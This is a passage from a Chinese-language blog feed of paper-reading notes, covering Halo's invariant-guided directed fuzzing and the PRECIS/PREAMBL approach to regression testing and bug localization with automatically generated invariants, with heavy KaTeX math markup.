class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">385</span></span></span></span></eq>, 其中 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq> 是 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi><mo>−</mo><mi>s</mi><mi>c</mi><mi>o</mi><mi>r</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">Z-score</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">score</span></span></span></span></eq> 决定错误 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ε</mi><mo>=</mo><mn>0.05</mn></mrow><annotation encoding="application/x-tex">ε=0.05</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ε</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0.05</span></span></span></span></eq> 的概率，即 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>95</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">95\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">95%</span></span></span></span></eq> 的置信度</li></ul><h5 id="remark-2" tabindex="-1">Remark 2</h5><ul><li>不像现有定向模糊方法只通过种子存储临时变量，Halo通过从运行输入保留更多运行反馈来限制进一步的输入的搜索空间。</li><li>基于这一直觉，输入选择旨在在数据收集的额外时间成本和推断不变量的准确度之间取得平衡。</li><li>此外，利用从可达和不可达输入推断出不变量不仅提高了方法的可扩展性，而且从两个方向压缩近似搜索空间，有助于提高精确度</li></ul><h4 id="3.3.-effective-input-generation-with-similarity-based-invariant-selection" tabindex="-1">3.3. Effective Input Generation with Similarity-based Invariant Selection</h4><ul><li>虽然可能的不变量可以帮助约束后续输入生成的搜索空间，但推理引擎可能会提供多个具有不同精度的潜在不变量，这可能不能平等地过滤掉不可达的输入。</li></ul><h3 id="4-%E8%AF%84%E4%BC%B0" tabindex="-1">4 评估</h3><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
            <tag> Fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用不变量在回归测试和错误定位</title>
      <link href="/2024/03/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%8F%98%E9%87%8F%E5%9C%A8%E5%9B%9E%E5%BD%92%E6%B5%8B%E8%AF%95%E5%92%8C%E9%94%99%E8%AF%AF%E5%AE%9A%E4%BD%8D/"/>
      <url>/2024/03/22/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%8F%98%E9%87%8F%E5%9C%A8%E5%9B%9E%E5%BD%92%E6%B5%8B%E8%AF%95%E5%92%8C%E9%94%99%E8%AF%AF%E5%AE%9A%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="using-automatically-generated-invariants-for-regression-testing-and-bug-localization" tabindex="-1">Using automatically generated invariants for regression testing and bug localization</h2><ul><li>引用：Sagdeo P, Ewalt N, Pal D, et al. Using automatically generated invariants for regression testing and bug localization[C], 2013 28th IEEE/ACM International Conference on Automated Software Engineering (ASE). IEEE, 2013: 634-639.</li><li>CCF A ASE</li><li><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=6693125">链接</a></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li>在软件开发和部署后，检测和定位软件中的错误行为都是具有挑战性的。在这项工作中，我们提出了一种新颖的方法来解决这一挑战，即在软件开发生命周期的不同阶段使用自动生成的程序不变量</li><li>我们在[1]种提出了PRECIS，一种不变量自动生成技术，其实用静态路径信息来引导静态分析，以生成程序不变量。其比[2,3,4]不变量生成技术好，因其表达性，覆盖度和扩展度</li><li>PRECIS对分支点（if/else和switch）语句的谓词值进行插桩，以收集关于程序或函数控制流结构如何影响其行为的动态信息。然后PRECIS利用程序执行期间收集的跟踪数据，动态推断谓词值与函数输入/输出之间的统计显著关系。如论文中的实验结果所示，PRECIS谓词的假阳性率低于10%</li><li>在本文工作中，我们将PRECIS自动化为一键式工具。我们提出了其在软件开发生命周期的不同阶段两个新颖而重要的应用<ul><li><ol><li>回归测试</li></ol></li><li><ol start="2"><li>错误定位</li></ol></li></ul></li><li>我们将驱动PRECIS谓词和不变量应用的总体技术称为PREAMBL。</li></ul><h4 id="regression-testing" tabindex="-1">Regression Testing</h4><ul><li>回归测试通常通过创建一组测试用例和期望输出来完成，这些测试用例涵盖了程序的预期行为[7]，[8]。 用来测试在原本程序种正确运行的功能，在新版本中依旧可以正常运行</li><li>通过PREAMBL，我们介绍了使用不变量进行回归测试的概念。不变量总结了程序的关键功能。而单个测试用例捕获一个程序执行，每个不变量可以捕获多个执行的预期行为，因此，验证不变量的有效性可能比传统测试更全面。</li><li>不变量旨在为输入/输出等价性的传统回归测试提供功能/行为检查的补充。</li><li>然而，不变量进行回归测试的权衡是，与测试不同，其不易跨版本移植。因此我们提出了方法的原则是，原始程序的不变量应该在新版本种也成立，为此需要检查从原始版本种获得的不变量是否还能适用新的版本<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_1.png" alt></li></ul><h4 id="bug-localization" tabindex="-1">Bug Localization</h4><ul><li>识别程序中的错误是调试种耗时的部分。</li><li>断言检查通常由于性能原因在软件发布时从程序中移除。因此，与其将断言集成到发布代码中，PREAMBL对程序的分支点进行轻量级插桩，以定位错误</li><li>部署后错误定位和分析的愿景如图2所示. 如果程序无法产生正确的输出，导致失败的分支点序列将用于识别最有可能导致失败的程序路径。通过统计分析确定了与失败高度相关的程序子路径。</li><li>与[12,9]类似，PREAMBL统计分析考虑了在路径上发生的总失败的比例及通过该路径的执行中导致失败的百分比。PREAMBL分析构建了一个路径频率树来识别最大重要性的子路径，使得PREAMBL能够确定与失败高度相关的可变长度子路径。而以往工作只推导了单个函数的固定长度路径，PREAMBL允许在大型函数中进行增强的定位，适用于高度局部化的错误以及根本原因跨越多个函数的错误。<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_2.png" alt></li></ul><h3 id="2-%E4%B8%8D%E5%8F%98%E9%87%8F%E7%94%9F%E6%88%90" tabindex="-1">2 不变量生成</h3><ul><li>PRECIS[1]对输入，输出，谓词进行插桩</li><li>执行跟踪数据由输入，谓词，输出具体值得元组组成</li><li>使用上述数据通过谓词聚类的过程生成不变量，详见论文[1]</li><li>本工作中，扩展[1]，以处理更复杂的控制和数据流结构<ul><li>Multiple Output Variables:</li><li>Function calls:</li><li>Loops:</li><li>Arrays and pointers:</li><li>实现：PRECIS插桩程序使用Fjalar[13]，基于Valgrind，最初支持Daikon的不变量生成。</li></ul></li></ul><h3 id="3-%E4%BD%BF%E7%94%A8precis%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E5%9B%9E%E5%BD%92%E6%B5%8B%E8%AF%95" tabindex="-1">3 使用PRECIS不变量的回归测试</h3><ul><li>如果在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>o</mi><mi>r</mi><mi>i</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{orig}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">or</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq> 中的不变量 在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>n</mi><mi>o</mi><mi>w</mi></mrow></msub><mo separator="true">,</mo><msub><mi>P</mi><mrow><mi>f</mi><mi>u</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>e</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{now},P_{future}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq> 上失败，则称测试到了回归</li><li>首先，由于程序新版中谓词变化不大，因此使用程序代码的字符串文字匹配，将新旧版本的谓词进行匹配，创建映射<ul><li>当谓词在版本间发生变化时，PRECIS可以通过程序员提供的注释来描述背后的意图</li><li>我们描述了映射不变式导致的三种情况，具体却决于将他们纳入新版本所需的程序员的工作程度<ul><li>情况1：不变量在两个版本间完全自动映射（需满足所有谓词都可以自动映射）</li><li>情况2：不变式需要一些程序员的努力才能在新版本中有效。这可能是由于需要为谓词添加注释或输入或输出变量名称更改</li><li>情况3：不变式无法在版本之间映射，这是由于基本代码发生了变化。</li><li>我们将在第5节讨论每种情况出现的频率及所得到的覆盖率</li></ul></li></ul></li><li>接下来将展示案例研究，展示了使用PRECIS生成的不变量进行回归测试的PREAMBL的有效性</li></ul><h4 id="a.-case-study" tabindex="-1">A. Case Study</h4><ul><li>下图展示了一个假设的科学计算应用中函数convert_units的实现。<ul><li>接受三个参数，value表示测量值，src表示传递值的单位，tgt表示要转换为的单位。</li><li>返回值是将输入值转换为目标单位的相应值。该函数设置了检查，以捕获整数溢出的情况，以及捕获不支持的转换。在这两种情况下，函数都返回-1，被视为无效值。</li><li>当在convert_units上运行PRECIS时，捕获到以下不变量：<ul><li>（1）(p0 = 1 ∧ p1 = 0) ⇒ (result = 36 × val)</li><li>（2）(p0 = 1 ∧ p1 = 1) ⇒ (result = −1)</li><li>（3）(p0 = 0 ∧ p1 = X) ⇒ (result = −1)</li></ul></li><li>假设开发人员重写了代码，使其更通用，如图所示，将YD_TO_IN定义为35。当开发人员运行测试套件时，不变量(1)将触发，因为当第一个if语句被执行而第二个if语句未执行时，结果不是36 × val。这迅速提醒开发人员代码中的错误。<ul><li>更重要的是，与仅比较应用程序输出值不同，失败的断言还明确告知开发人员特定的上下文（在本例中，是没有溢出的yd. to in.转换），在这种上下文中函数输出（在本例中是convert_unit的结果）出现问题。这有助于开发人员快速有效地隔离错误。<br><img src="/images/%E8%AE%BA%E6%96%87/invariant/1_3.png" alt></li></ul></li></ul></li></ul><h3 id="4-%E4%BD%BF%E7%94%A8precis%E4%B8%8D%E5%8F%98%E9%87%8F%E7%9A%84%E9%94%99%E8%AF%AF%E5%AE%9A%E4%BD%8D" tabindex="-1">4 使用PRECIS不变量的错误定位</h3><ul><li>PREAMBL捕获程序路径信息，通过对控制流分支点（如if语句，case语句等）进行插桩作为谓词。因此，谓词对应于控制流图(CFG)中的节点，谓词的值通过的图的方向。</li><li>对于一个程序运行，一些列谓词及其值表示了程序中经过的路径。本文中，使用格式 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mn>0</mn><mo>=</mo><mi>v</mi><mn>0</mn><mo stretchy="false">)</mo><mo>⇒</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo>⇒</mo><mo stretchy="false">(</mo><mi>p</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo>=</mo><mi>v</mi><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p0 = v0) ⇒ · · · ⇒ (pn−1 = vn−1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span></span><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mpunct">⋅⋅⋅</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></eq> 来表示一个程序路径，如果  <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mn>0</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">v0 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq> ，则采用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">p0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord">0</span></span></span></span></eq> 分支，如果 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mn>0</mn><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">v0 = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></eq> ，则不采用，然后评估一些其他谓词，最后评估 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">pn−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq> 分支为值 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">vn−1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>。</li><li>每个这样的序列都标记为“成功”（生成期望的输出）或“失败”（未生成期望的输出），取决于给定程序执行的结果。</li><li>为了定量评估路径，PREAMBL使用了 [10]提出[9]也是用的算法。该算法中，我们为每个路径 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 收集了4个测量值<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_e(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 路径p被执行的成功运行次数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F_e(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 路径p被执行的失败运行次数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_o(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 路径p被观察到的成功运行的次数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F_o(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq> 路径p被观察到的失败运行的次数</li><li>如果所有构成路径的谓词都评估为其指定的值，则认为该路径已执行； 如果路径中的第一个谓词被评估，都视为已被观察到。</li></ul></li><li>利用这些测量值和F，即总失败运行次数。我们计算4个分数来定量判断路径上有bug的指示程度。然而路径运行失败不一定是bug，也可能是几个错误的谓语造成的路径运行失败<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>e</mi><mi>n</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>v</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><msub><mi>F</mi><mi>e</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Sensitivity(p) = log(F_e(p))/log(F)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">))</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>F</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msub><mi>F</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>S</mi><mi>o</mi></msub><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Context(p) = F_o(p)/(F_o(p)+S_o(p))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span 